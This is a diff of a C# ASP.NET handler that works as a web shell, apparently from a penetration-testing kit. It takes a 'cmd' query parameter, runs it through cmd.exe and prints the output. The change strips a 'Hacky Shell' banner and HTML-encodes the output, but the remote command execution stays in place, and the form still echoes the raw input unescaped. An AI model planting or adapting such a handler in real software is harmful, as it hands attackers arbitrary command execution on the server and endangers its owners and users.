@@ -17,11 +17,9 @@ public class AverageHandler : IHttpHandler
 		Uri theRealURL = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
 		string teh_cmd = HttpUtility.ParseQueryString(theRealURL.Query).Get("cmd");
 
-		ctx.Response.Write("<strong>Happy Hypn's Hacky Shell</strong><br />");
-		ctx.Response.Write("<marquee style='color: #FF00FF'><3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;<3 SensePost&nbsp;&nbsp;&nbsp;&nbsp;</marquee><br />");
 		ctx.Response.Write("<form method='GET'><input name='cmd' value='"+teh_cmd+"'><input type='submit'></from>");
 		ctx.Response.Write("<hr>");
-		
+
 		ctx.Response.Write("<pre>");
 		ProcessStartInfo psi = new ProcessStartInfo();
 		psi.FileName = "cmd.exe";
@@ -33,8 +31,6 @@ public class AverageHandler : IHttpHandler
 		string s = stmrdr.ReadToEnd();
 		stmrdr.Close();
 
-		ctx.Response.Write(s);
-	} 
-
+		ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));
+	}
 }
-
